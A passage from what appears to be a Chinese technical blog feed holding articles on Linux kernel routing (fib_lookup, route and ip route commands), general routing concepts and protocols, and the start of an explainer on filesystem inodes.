href="https://s2.51cto.com/oss/202201/13/060363e6c7904e403ad1a7ade8f5e8d2.png"><img src="https://s2.51cto.com/oss/202201/13/060363e6c7904e403ad1a7ade8f5e8d2.png" alt="img"></a></p><h3 id="2-2-路由查找"><a href="#2-2-路由查找" class="headerlink" title="2.2 路由查找"></a>2.2 路由查找</h3><p>在上面的小节中我们看到，发送过程调用 ip_route_output_ports 来查找路由，接收过程调用 ip_route_input_slow 来查找。但其实这两个函数都又最终会调用到 fib_lookup 这个核心函数，源码如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/ipv4/route.c </span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rtable</span> *__<span class="hljs-title">ip_route_output_key</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> *<span class="hljs-title">net</span>, <span class="hljs-keyword">struct</span> <span class="hljs-title">flowi4</span> *<span class="hljs-title">fl4</span>) </span><br><span class="hljs-class">&#123;</span> <br> ... <br> <span class="hljs-comment">// 进入 fib_lookup </span><br> <span class="hljs-keyword">if</span> (fib_lookup(net, fl4, &amp;res)) &#123; <br> &#125; <br>&#125; <br> <br><span class="hljs-comment">//file: net/ipv4/route.c </span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ip_route_input_slow</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb, __be32 daddr, __be32 saddr, </span><br><span class="hljs-params">          u8 tos, <span class="hljs-keyword">struct</span> net_device *dev)</span> <br>&#123; <br> ... <br> <span class="hljs-comment">// 进入 fib_lookup </span><br> err = fib_lookup(net, &amp;fl4, &amp;res); <br>&#125; <br></code></pre></td></tr></table></figure><p>我们来看下 fib_loopup 都干了啥。为了容易理解，我们只看一下不支持多路由表版本的 fib_lookup。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: include/net/ip_fib.h </span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fib_lookup</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> flowi4 *flp, </span><br><span class="hljs-params">        <span class="hljs-keyword">struct</span> fib_result *res)</span> <br>&#123; <br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fib_table</span> *<span class="hljs-title">table</span>;</span> <br> <br> table = fib_get_table(net, RT_TABLE_LOCAL); <br> <span class="hljs-keyword">if</span> (!fib_table_lookup(table, flp, res, FIB_LOOKUP_NOREF)) <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br> <br> table = fib_get_table(net, RT_TABLE_MAIN); <br> <span class="hljs-keyword">if</span> (!fib_table_lookup(table, flp, res, FIB_LOOKUP_NOREF)) <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br> <span class="hljs-keyword">return</span> -ENETUNREACH; <br>&#125; <br></code></pre></td></tr></table></figure><p>这个函数就是依次到 local 和 main 表中进行匹配，匹配到后就返回，不会继续往下匹配。从上面可以看到 local 表的优先级要高于 main 表，如果 local 表中找到了规则，则路由过程就结束了。</p><p>这也就是很多同学说为什么 ping 本机的时候在 eth0 上抓不到包的根本原因。所有命中 local 表的包都会被送往 loopback 设置，不会过 eth0。</p><h2 id="三、路由的使用方法"><a href="#三、路由的使用方法" class="headerlink" title="三、路由的使用方法"></a>三、路由的使用方法</h2><h3 id="3-1-开启转发路由"><a href="#3-1-开启转发路由" class="headerlink" title="3.1 开启转发路由"></a>3.1 开启转发路由</h3><p>在默认情况下，Linux 上的转发功能是关闭的，这时候 Linux 发现收到的网络包不属于自己就会将其丢弃。</p><p>但在某些场景下，例如对于容器网络来说，Linux 需要转发本机上其它网络命名空间中过来的数据包，需要手工开启转发。如下这两种方法都可以。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">sysctl -w net.ipv4.ip_forward=1</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">sysctl net.ipv4.conf.all.forwarding=1</span> <br></code></pre></td></tr></table></figure><p>开启后，Linux 就能像路由器一样对不属于本机(严格地说是本网络命名空间)的 IP 数据包进行路由转发了。</p><h3 id="3-2-查看路由表"><a href="#3-2-查看路由表" class="headerlink" title="3.2 查看路由表"></a>3.2 查看路由表</h3><p>在默认情况下，Linux 只有 local 和 main 两个路由表。如果内核编译时支持策略路由，那么管理员最多可以配置 255 个独立的路由表。在 centos 上可以通过以下方式查看是否开启了 CONFIG_IP_MULTIPLE_TABLES 多路由表支持。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> /boot/config-3.10.0-693.el7.x86_64</span>  <br>CONFIG_IP_MULTIPLE_TABLES=y <br>... <br></code></pre></td></tr></table></figure><p>所有的路由表按照从 0 - 255 进行编号，每个编号都有一个别名。编号和别名的对应关系在 &#x2F;etc&#x2F;iproute2&#x2F;rt_tables 这个文件里可以查到。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> /etc/iproute2/rt_tables</span> <br>255     local <br>254     main <br>253     default <br>0       unspec <br>200     eth0_table <br></code></pre></td></tr></table></figure><p>查看某个路由表的配置，通过使用 ip route list table {表名} 来查看。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">ip route list table <span class="hljs-built_in">local</span></span> <br>local 10.143.x.y dev eth0 proto kernel scope host src 10.143.x.y <br>local 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1 <br></code></pre></td></tr></table></figure><p>如果是查看 main 路由表，也可以直接使用 route 命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">route -n</span> <br>Kernel IP routing table <br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface <br>10.0.0.0        10.*.*.254      255.0.0.0       UG    0      0        0 eth0 <br>10.*.*.0        0.0.0.0         255.255.248.0   U     0      0        0 eth0 <br></code></pre></td></tr></table></figure><p>上面字段中的含义如下</p><ul><li>Destination：目的地址，可以是一个具体的 IP，也可以是一个网段，和 Genmask 一起表示。</li><li>Gateway：网关地址，如果是 0.0.0.0 表示不需要经过网关。</li><li>Flags: U 表示有效，G 表示连接路由，H 这条规则是主机路由，而不是网络路由。</li><li>Iface：网卡设备，使用哪个网卡将包送过去。</li></ul><p>上述结果中输出的第一条路由规则表示这台机器下，确切地说这个网络环境下，所有目标为 10.0.0.0&#x2F;8(Genmask 255.0.0.0 表示前 8 位为子网掩码) 网段的网络包都要通过 eth0 设备送到 10…254 这个网关，由它再帮助转发。</p><p>第二条路由规则表示，如果目的地址是 10…0&#x2F;21(Genmask 255.255.248.0 表示前 21 位为子网掩码)则直接通过 eth0 发出即可，不需要经过网关就可通信。</p><h3 id="3-3-修改路由表"><a href="#3-3-修改路由表" class="headerlink" title="3.3 修改路由表"></a>3.3 修改路由表</h3><p>默认的 local 路由表是内核根据当前机器的网卡设备配置自动生成的，不需要手工维护。对于main 的路由表配置我们一般只需要使用 route add 命令就可以了，删除使用 route del。</p><p>修改主机路由</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">route add -host 192.168.0.100 dev eth0 //直连不用网关</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">route add -host 192.168.1.100 dev eth0 gw 192.168.0.254 //下一跳网关</span> <br></code></pre></td></tr></table></figure><p>修改网络路由</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">route add -net 192.168.1.0/24 dev eth0 //直连不用网关</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">route add -net 192.168.1.0/24 dev eth0 gw 10.162.132.110 //下一跳网关</span> <br></code></pre></td></tr></table></figure><p>也可以指定一条默认规则，不命中其它规则的时候会执行到这条。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">route add default gw 192.168.0.1 eth0</span> <br></code></pre></td></tr></table></figure><p>对于其它编号的路由表想要修改的话，就需要使用 ip route 命令了。这里不过多展开，只用 main 表举一个例子，有更多使用需求的同学请自行搜索。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">ip route add 192.168.5.0/24 via 10.*.*.110 dev eth0 table main</span> <br></code></pre></td></tr></table></figure><h3 id="3-4-路由规则测试"><a href="#3-4-路由规则测试" class="headerlink" title="3.4 路由规则测试"></a>3.4 路由规则测试</h3><p>在配置了一系列路由规则后，为了快速校验是否符合预期，可以通过 ip route get 命令来确认。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">ip route get 192.168.2.25</span> <br>192.168.2.25 via 10.*.*.110 dev eth0 src 10.*.*.161 <br>    cache <br></code></pre></td></tr></table></figure><h2 id="本文总结"><a href="#本文总结" class="headerlink" title="本文总结"></a>本文总结</h2><p>在现如今各种网络虚拟化技术里，到处都能看着对路由功能的灵活应用。所以我们今天专门深入研究了一下 Linux 路由工作原理。</p><p>在 Linux 内核中，对于发送过程和接收过程都会涉及路由选择，其中接收过程的路由选择是为了判断是该本地接收还是将它转发出去。</p><p><a href="https://s2.51cto.com/oss/202201/13/7304e92c24d9dbaa4bab32bd175f1052.png"><img src="https://s2.51cto.com/oss/202201/13/7304e92c24d9dbaa4bab32bd175f1052.png" alt="img"></a></p><p>默认有 local 和 main 两个路由表，不过如果安装的 linux 开启了 CONFIG_IP_MULTIPLE_TABLES 选项的话，最多能支持 255 张路由表。</p><p>路由选择过程其实不复杂，就是根据各个路由表的配置找到合适的网卡设备，以及下一跳的地址，然后把包转发出去就算是完事。</p><p>通过合适地配置路由规则，容器中的网络环境和外部的通信不再是难事。通过大量地干预路由规则就可以实现虚拟网络互通。</p><p><a href="https://s4.51cto.com/oss/202201/13/05de6ceb19f48b5c7e4471b4abd52512.png"><img src="https://s4.51cto.com/oss/202201/13/05de6ceb19f48b5c7e4471b4abd52512.png" alt="img"></a></p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>什么是路由？</title>
    <link href="/2023/02/12/%E4%BB%80%E4%B9%88%E6%98%AF%E8%B7%AF%E7%94%B1%EF%BC%9F/"/>
    <url>/2023/02/12/%E4%BB%80%E4%B9%88%E6%98%AF%E8%B7%AF%E7%94%B1%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是路由？"><a href="#什么是路由？" class="headerlink" title="什么是路由？"></a>什么是路由？</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>路由是指路由器从一个接口上收到数据包，根据数据包的目的地址进行定向并转发到另一个接口的过程。</strong>路由发生在<a href="https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B">OSI网络参考模型中</a>的第三层即<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%B1%82">网络层</a>。</p><p>路由引导<a href="https://zh.wikipedia.org/w/index.php?title=%E5%88%86%E7%BB%84%E8%BD%89%E9%80%81&action=edit&redlink=1">分组转送</a>，经过一些中间的<a href="https://zh.wikipedia.org/wiki/%E7%AF%80%E9%BB%9E">节点</a>后，到它们最后的目的地。作成硬件的话，则称为<a href="https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1%E5%99%A8">路由器</a>。路由通常根据<a href="https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1%E8%A1%A8">路由表</a>——一个存储到各个目的地的最佳路径的表——来引导分组转送。因此为了有效率的转送分组，创建存储在路由器<a href="https://zh.wikipedia.org/wiki/%E8%A8%98%E6%86%B6%E9%AB%94">存储器</a>内的路由表是非常重要的。</p><p>路由与<a href="https://zh.wikipedia.org/wiki/%E6%A1%A5%E6%8E%A5">桥接</a>的不同，在于路由假设地址相似的节点距离相近。这使得路由表中的一项纪录可以表示到一群地址的路径。因此，在大型网络中，路由优于桥接，且路由已经成为<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E9%9A%9B%E7%B6%B2%E8%B7%AF">互联网</a>上查找路径的最主要方法。</p><p>较小的网络通常可以手动设置路由表，但较大且拥有复杂<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E7%B5%A1%E6%8B%93%E6%92%B2">拓扑</a>的网络可能常常变化，若要手动创建路由表是不切实际的。尽管如此，大多数的<a href="https://zh.wikipedia.org/wiki/%E5%85%AC%E5%85%B1%E4%BA%A4%E6%8D%A2%E7%94%B5%E8%AF%9D%E7%BD%91">公共交换电话网络</a>（PSTN）仍然使用预先计算好的路由表，在直接连线的路径断线时才使用预备的路径；见<a href="https://zh.wikipedia.org/w/index.php?title=%E5%85%AC%E5%85%B1%E4%BA%A4%E6%8F%9B%E9%9B%BB%E8%A9%B1%E7%B6%B2%E8%B7%AF%E7%94%B1&action=edit&redlink=1">公共交换电话网路由</a>。“动态路由”尝试按照由<a href="https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1%E5%8D%94%E5%AE%9A">路由协议</a>所携带的信息来自动创建路由表以解决这个问题，也让网络能够近自主地避免网络断线或失败。</p><p>动态路由作为当前最普及的实现方式。然而，设置路由协议常须要经验与技术；目前的网络技术还没有发展到能够全自动地设置路由。</p><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>数据以数据包的形式沿着任何网络传输。每个数据包都有一个标头，其中包含有关数据包预定目的地的信息。当数据包向目的地移动时，多台路由器可能会对其进行多次路由。路由器每秒对数百万个数据包执行此过程数百万次。</p><p>当数据包到达时，路由器首先在路由表中查找其地址。这类似于乘客查阅公交时刻表以找到前往目的地的最佳公交路线。然后，路由器将数据包转发或移动到网络中的下一个点。</p><p>例如，当您从办公室网络中的计算机访问网站时，数据包首先会发送到办公室网络路由器。路由器查找标头数据包并确定数据包的目的地。然后，它查找其内部表并将数据包转发到网络内部的下一个路由器或另一台设备，例如打印机。</p><h2 id="有哪些类型？"><a href="#有哪些类型？" class="headerlink" title="有哪些类型？"></a>有哪些类型？</h2><p>有两种不同的路由类型，取决于路由器创建路由表的方式：</p><h3 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h3><p>在静态路由中，网络管理员使用静态表手动配置和选择网络路由。在网络设计或参数需要保持不变的情况下，静态路由非常有用。</p><p>这种路由技术的静态特性会带来预期的缺点，例如网络拥塞。虽然管理员可以在链路出现故障时配置回退路径，但静态路由通常会降低网络的适应性和灵活性，从而限制网络性能。</p><h3 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h3><p>在动态路由中，路由器根据实际网络条件在运行时创建和更新路由表。它们尝试使用动态路由协议找到从源到目的地的最快路径，动态路由协议是一组用于创建、维护和更新动态路由表的规则。</p><p>动态路由的最大优势在于它可以适应不断变化的网络条件，包括流量、带宽和网络故障。</p><h2 id="主要的路由协议有哪些？"><a href="#主要的路由协议有哪些？" class="headerlink" title="主要的路由协议有哪些？"></a>主要的路由协议有哪些？</h2><p>路由协议是一组规则，用于指定路由器如何识别和转发网络路径上的数据包。路由协议分为两个不同的类别：内部网关协议和外部网关协议。</p><p>内部网关协议最适合自治系统，即由单一组织管理控制的网络。外部网关协议可以更好地管理两个自治系统之间的信息传输。</p><h3 id="内部网关协议"><a href="#内部网关协议" class="headerlink" title="内部网关协议"></a>内部网关协议</h3><p>这些协议评估自治系统，并根据不同的指标做出路由决策，如下所示：</p><ul><li>跳数，或源和目的地之间的路由器数量</li><li>延迟，或将数据从源发送到目的地所花费的时间</li><li>带宽，或源和目的地之间的链路容量</li></ul><p>以下是内部网关协议的一些示例。</p><h4 id="路由信息协议-RIP"><a href="#路由信息协议-RIP" class="headerlink" title="路由信息协议-RIP"></a>路由信息协议-RIP</h4><p>路由信息协议（RIP）依靠跳数来确定网络之间的最短路径。RIP 是一种传统协议，如今已经没有人使用，因为它不能很好地扩展到更大规模的网络实施。</p><h4 id="开放最短路径优先协议-OSPF"><a href="#开放最短路径优先协议-OSPF" class="headerlink" title="开放最短路径优先协议-OSPF"></a>开放最短路径优先协议-OSPF</h4><p>开放最短路径优先协议（OSPF）从自治系统中的所有其他路由器收集信息，以确定通往数据包目的地的最短和最快路由。您可以使用各种路由算法或计算机进程实施 OSPF。</p><h3 id="外部网关协议"><a href="#外部网关协议" class="headerlink" title="外部网关协议"></a>外部网关协议</h3><p>边界网关协议（BGP）是唯一的外部网关协议。</p><h4 id="边界网关协议-BGP"><a href="#边界网关协议-BGP" class="headerlink" title="边界网关协议-BGP"></a>边界网关协议-BGP</h4><p>BGP 定义了通过互联网进行的通信。互联网是连接在一起的自治系统的大集合。每个自治系统都有自治系统号（ASN），它是通过向互联网号码分配机构注册而获得的。</p><p>BGP 的工作原理是跟踪最近的 ASN 并将目的地地址映射到其各自的 ASN。</p><h2 id="什么是路由算法？"><a href="#什么是路由算法？" class="headerlink" title="什么是路由算法？"></a>什么是路由算法？</h2><p>路由算法是实现不同路由协议的软件程序。它们的工作原理是为每条链路分配一个成本数字；成本数字是使用各种网络指标计算的。每台路由器都尝试以最低的成本将数据包转发到下一个最佳链路。</p><p>通常使用以下两种形式的路由协议来达成：<strong>距离向量算法</strong>与<strong>连线状态算法</strong>。所有路由算法几乎都可以分类到这两种算法中。</p><h3 id="距离矢量路由"><a href="#距离矢量路由" class="headerlink" title="距离矢量路由"></a>距离矢量路由</h3><p>距离矢量路由算法要求所有路由器定期互相更新找到的最佳路径信息。每台路由器都会向所有已知目的地发送有关当前总成本评估的信息。</p><p>最终，网络中的每台路由器都会发现所有可能的目的地的最佳路径信息。</p><h3 id="链路状态路由"><a href="#链路状态路由" class="headerlink" title="链路状态路由"></a>链路状态路由</h3><p>在链路状态路由中，每台路由器都会发现网络中的所有其他路由器。路由器利用此信息绘制整个网络的地图，然后计算任何数据包的最短路径。</p><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p><strong>路由表</strong>: 指记录路由信息的表(可以单路由表，也可以多路由表)</p><p><img src="https://pic2.zhimg.com/80/v2-17f7830d4946289147741de28f343731_1440w.webp" alt="img"></p><p><img src="https://pic2.zhimg.com/80/v2-3f7592eb1094899f0e5ec71b728b8359_1440w.webp" alt="img"></p><p><strong>问题1</strong>: 按上面的路由表来看,如果要访问10.1.1.1这个IP,请问会怎么走?</p><p>答: 会通过10.1.1.0&#x2F;255.255.255.0这个路由条目后面指示的ens33网卡去寻找10.1.1.1。</p><p><strong>问题2</strong>: 按上面的路由表来看,如果要访问119.75.217.26这个IP,请问会怎么走?</p><p>答: 会通过网关10.1.1.2去寻找。</p><p>当在一台linux机器上要访问一个目标ip时，请记住linux以下<strong>四步口诀</strong>(<strong>在linux默认的单路由表情况下</strong>,如果想更深 入了解多路由表,请看课外拓展内容):</p><p><strong>如果本机有目标ip，则会直接访问本地; 如果本地没有目标ip，则看第2步</strong></p><ol><li><strong>用route -n查看路由，如果路由条目里包含了目标ip的网段，则数据包就会从对应路由条目后面的网卡出去</strong></li><li><strong>如果没有对应网段的路由条目，则全部都走网关</strong></li><li><strong>如果网关也没有，则报错：网络不可达</strong></li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>   1.维基百科 <a href="https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1">https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1</a></p><p>   2.<a href="https://zhuanlan.zhihu.com/p/149243461">https://zhuanlan.zhihu.com/p/149243461</a></p><ol start="3"><li><a href="https://zhuanlan.zhihu.com/p/61805945">掌握Linux路由这一篇就够了！</a></li><li><a href="https://aws.amazon.com/cn/what-is/routing/">什么是路由？</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>linux</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>什么是inode？</title>
    <link href="/2023/02/10/%E4%BB%80%E4%B9%88%E6%98%AFinode%EF%BC%9F/"/>
    <url>/2023/02/10/%E4%BB%80%E4%B9%88%E6%98%AFinode%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是inode？"><a href="#什么是inode？" class="headerlink" title="什么是inode？"></a>什么是inode？</h1><blockquote><p>主要内容转载自<a href="https://www.ruanyifeng.com/">阮一峰的理解inode</a></p><p>关于inode的命名：Unix先驱<a href="https://zh.wikipedia.org/wiki/%E4%B8%B9%E5%B0%BC%E6%96%AF%C2%B7%E9%87%8C%E5%A5%87">丹尼斯·里奇</a>说，inode这个命名的来源可能是文件系统的存储组织为一个扁平数组，分层目录信息使用一个数作为文件系统这个扁平数组的索引值（index）。</p></blockquote><h2 id="一、inode是什么？"><a href="#一、inode是什么？" class="headerlink" title="一、inode是什么？"></a><strong>一、inode是什么？</strong></h2><p>理解inode，要从文件储存说起。</p><p>文件储存在硬盘上，硬盘的最小存储单位叫做”扇区”（Sector）。每个扇区储存512字节（相当于0.5KB）。</p><p>操作系统读取硬盘的时候，不会一个个扇区地读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个”块”（block）。这种由多个扇区组成的”块”，是文件存取的最小单位。”块”的大小，最常见的是4KB，即连续八个 sector组成一个 block。</p><p>文件系统创建（格式化）时，就把<strong>存储区域分为两大连续的存储区域</strong>。<strong>一个用来保存文件系统对象的元信息数据，这是由inode组成的表</strong>，每个inode默认是<strong>256字节或者128字节</strong>。<strong>另一个用来保存“文件系统对象”的内容数据</strong>，划分为512字节的扇区，以及由8个扇区组成的4K字节的块。块是读写时的基本单位。一个文件系统的inode的总数一般情况下是固定的。这限制了该文件系统所能存储的文件系统对象的总数目。典<strong>型的实现下，所有inode占用了文件系统1%左右的存储容量。</strong></p><p>文件系统中每个“文件系统对象”对应一个“inode”数据，并用一个整数值来辨识。这个整数常被称为<strong>inode号码</strong>（“i-number”或“inode number”）。由于文件系统的inode表的存储位置、总条目数量都是固定的，<strong>因此可以用inode号码去索引查找inode表</strong>。</p><p><strong>Inode存储了文件系统对象的一些元信息，如所有者、访问权限（读、写、执行）、类型（是文件还是目录）、内容修改时间、inode修改时间、上次访问时间、对应的文件系统存储块的地址，等等。知道了1个文件的inode号码，就可以在inode元数据中查出文件内容数据的存储地址。</strong></p><p>文件名与目录名是“文件系统对象”便于使用的别名。一个文件系统对象可以有多个别名，但只能有一个inode，并用这个inode来索引文件系统对象的存储位置。</p><ul><li><strong>inode不包含文件名或目录名的字符串，只包含文件或目录的“元信息”。</strong></li><li>Unix的文件系统的目录也是一种文件。打开目录，实际上就是读取“目录文件”。目录文件的结构是一系列<strong>目录项</strong>（dirent）的列表。每个目录项，由两部分组成：所包含文件或目录的名字，以及该文件或目录名对应的inode号码。</li><li>文件系统中的一个文件是指存放在其所属目录的“目录文件”中的一个目录项，其所对应的inode的类别为“文件”；文件系统中的一个目录是指存放在其“父目录文件”中的一个目录项，其所对应的inode的类别为“目录”。可见，多个“文件”可以对应同一个inode；多个“目录”可以对应同一个inode。</li><li>文件系统中如果两个文件或者两个目录具有相同的inode号码，那么就称它们是“硬链接”关系。实际上都是这个inode的别名。换句话说，一个inode对应的所有文件（或目录）中的每一个，都对应着文件系统某个“目录文件”中唯一的一个目录项。</li><li>创建一个目录时，实际做了3件事：在其“父目录文件”中增加一个条目；分配一个inode；再分配一个存储块，用来保存当前被创建目录包含的文件与子目录。被创建的“目录文件”中自动生成两个子目录的条目，名称分别是：“.”和“..”。前者与该目录具有相同的inode号码，因此是该目录的一个“硬链接”。后者的inode号码就是该目录的父目录的inode号码。所以，任何一个目录的”硬链接”总数，总是等于它的子目录总数（含隐藏目录）加2。即每个“子目录文件”中的“..”条目，加上它自身的“目录文件”中的“.”条目，再加上“父目录文件”中的对应该目录的条目。</li><li><strong>通过文件名打开文件，实际上是分成三步实现：首先，操作系统找到这个文件名对应的inode号码；其次，通过inode号码，获取inode信息；最后，根据inode信息，找到文件数据所在的block，读出数据。</strong></li></ul><h2 id="二、inode的内容"><a href="#二、inode的内容" class="headerlink" title="二、inode的内容"></a><strong>二、inode的内容</strong></h2><p>inode包含文件的元信息，具体来说有以下内容：</p><blockquote><p>　　* 文件的字节数</p><p>　　* 文件拥有者的User ID</p><p>　　* 文件的Group ID</p><p>　　* 文件的读、写、执行权限</p><p>　　* 文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。</p><p>　　* 链接数，即有多少文件名指向这个inode</p><p>　　* <strong>文件数据block的位置</strong></p></blockquote><p>可以用stat命令，查看某个文件的inode信息：</p><blockquote><p>　　stat example.txt</p></blockquote><p><img src="https://www.ruanyifeng.com/blogimg/asset/201112/bg2011120402.png" alt="img"></p><p>总之，除了文件名以外的所有文件信息，都存在inode之中。至于为什么没有文件名，下文会有详细解释。</p><h2 id="三、inode的大小"><a href="#三、inode的大小" class="headerlink" title="三、inode的大小"></a><strong>三、inode的大小</strong></h2><p>inode也会消耗硬盘空间，所以硬盘格式化的时候，操作系统自动将硬盘分成两个区域。一个是数据区，存放文件数据；另一个是inode区（inode table），存放inode所包含的信息。</p><p>每个inode节点的大小，一般是128字节或256字节。inode节点的总数，在格式化时就给定，一般是每1KB或每2KB就设置一个inode。假定在一块1GB的硬盘中，每个inode节点的大小为128字节，每1KB就设置一个inode，那么inode table的大小就会达到128MB，占整块硬盘的12.8%。</p><p>查看每个硬盘分区的inode总数和已经使用的数量，可以使用df命令。</p><blockquote><p>　　df -i</p></blockquote><p><img src="https://www.ruanyifeng.com/blogimg/asset/201112/bg2011120403.png" alt="img"></p><p>查看每个inode节点的大小，可以用如下命令：</p><blockquote><p>　　sudo dumpe2fs -h &#x2F;dev&#x2F;hda | grep “Inode size”</p></blockquote><p><img src="https://www.ruanyifeng.com/blogimg/asset/201112/bg2011120404.png" alt="img"></p><p>由于每个文件都必须有一个inode，因此有可能发生inode已经用光，但是硬盘还未存满的情况。这时，就无法在硬盘上创建新文件。</p><h2 id="四、inode号码"><a href="#四、inode号码" class="headerlink" title="四、inode号码"></a><strong>四、inode号码</strong></h2><p>每个inode都有一个号码，操作系统用inode号码来识别不同的文件。</p><p>这里值得重复一遍，Unix&#x2F;Linux系统内部不使用文件名，而使用inode号码来识别文件。对于系统来说，文件名只是inode号码便于识别的别称或者绰号。</p><p>表面上，用户通过文件名，打开文件。实际上，系统内部这个过程分成三步：首先，系统找到这个文件名对应的inode号码；其次，通过inode号码，获取inode信息；最后，根据inode信息，找到文件数据所在的block，读出数据。</p><p>使用ls -i命令，可以看到文件名对应的inode号码：</p><blockquote><p>　　ls -i example.txt</p></blockquote><p><img src="https://www.ruanyifeng.com/blogimg/asset/201112/bg2011120405.png" alt="img"></p><h2 id="五、目录文件"><a href="#五、目录文件" class="headerlink" title="五、目录文件"></a><strong>五、目录文件</strong></h2><p>Unix&#x2F;Linux系统中，目录（directory）也是一种文件。打开目录，实际上就是打开目录文件。</p><p>目录文件的结构非常简单，就是一系列目录项（dirent）的列表。每个目录项，由两部分组成：所包含文件的文件名，以及该文件名对应的inode号码。</p><p>ls命令只列出目录文件中的所有文件名：</p><blockquote><p>　　ls &#x2F;etc</p></blockquote><p><img src="https://www.ruanyifeng.com/blogimg/asset/201112/bg2011120406.png" alt="img"></p><p>ls -i命令列出整个目录文件，即文件名和inode号码：</p><blockquote><p>　　ls -i 